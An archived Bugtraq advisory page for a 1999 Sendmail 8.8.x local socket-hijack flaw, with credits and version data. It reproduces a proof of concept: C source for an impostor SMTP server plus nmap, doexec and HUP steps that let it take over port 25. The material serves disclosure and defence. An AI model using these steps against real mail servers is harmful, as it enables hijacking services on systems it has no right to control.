<p><b><span style="font-size: 18pt;">Sendmail Socket Hijack Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/774/info">info</a><br><a href="http://www.securityfocus.com/bid/774/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/774/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/774/solution">solution</a><br><a href="http://www.securityfocus.com/bid/774/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				774
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Nov 05 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Nov 05 1999 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was discovered by Michal Zalewski &lt;lcamtuf@ids.pl&gt; and posted to BugTraq on Nov 5, 1999.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Eric Allman Sendmail 8.8 .x<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
				
					Eric Allman Sendmail 8.9.1 <br/>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	See discussion for more detailed information.<br/><br/>Below is a summarized list of steps and example code from Michal Zalewski's BugTraq posting:<br/><br/>victim$ cd /tmp<br/>victim$ cat &gt;test.c &lt;&lt;EOF<br/><br/>#include &lt;netinet/in.h&gt;<br/>#include &lt;fcntl.h&gt;<br/><br/>#define SERV_FD 4<br/><br/>main() {<br/>  struct sockaddr_in saddr;<br/>  int csock,i=sizeof(saddr);<br/>  while (1) {<br/>    while ((csock=accept(SERV_FD,&amp;saddr,&amp;i))&lt;0);<br/>    if (!fork()) {<br/>      dup2(csock,0);<br/>      dup2(csock,1);<br/>      dup2(csock,2);<br/>      printf("220 Takeover ESMTP mail service - road closed.\n");<br/>      fflush(0);<br/>      sleep(1);<br/>      shutdown(csock,2);<br/>      close(csock);<br/>      exit(0);<br/>    }<br/>  }<br/>}<br/>EOF<br/><br/>victim$ gcc test.c -o test<br/><br/>(compile simple harmless sendmail-imposter)<br/><br/>attacker# nmap -p 25 -sS -P0 -n victim<br/><br/>(half open tcp connection is made, original smtpd goes to sleep for 5 seconds)<br/><br/>victim$ doexec /usr/sbin/sendmail /tmp/test -bD<br/><br/>(user starts sendmail, arvg0 replaced with '/tmp/test')<br/><br/>victim$ killall -HUP sendmail<br/><br/>(user sends HUP to sendmail, /tmp/test is executed)<br/><br/>victim$telnet localhost 25<br/>220 Takeover ESMTP mail service - road closed.<br/>victim$
	
		<ul>
</ul>
</div>